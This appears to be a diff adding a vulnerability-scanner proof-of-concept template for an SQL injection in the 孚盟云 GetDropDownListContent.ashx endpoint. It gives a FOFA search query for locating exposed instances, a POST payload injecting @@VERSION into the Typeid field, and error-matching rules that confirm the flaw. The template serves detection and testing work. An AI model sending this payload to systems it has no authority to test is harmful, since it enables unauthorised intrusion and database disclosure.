@@ -1,0 +1,18 @@
+id: poc-yaml-fumasoft-getdropdownlistcontent-ashx-sqli
+info:
+  name: 孚盟云 GetDropDownListContent.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+requests:
+- method: POST
+  path: /Ajax/GetDropDownListContent.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=getType&Typeid=-1/@@VERSION
+  expression: status_code == 500 && contains(body,"Microsoft SQL Server") && contains(body,"Exception:")
+    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+variables: {}
+transport: http
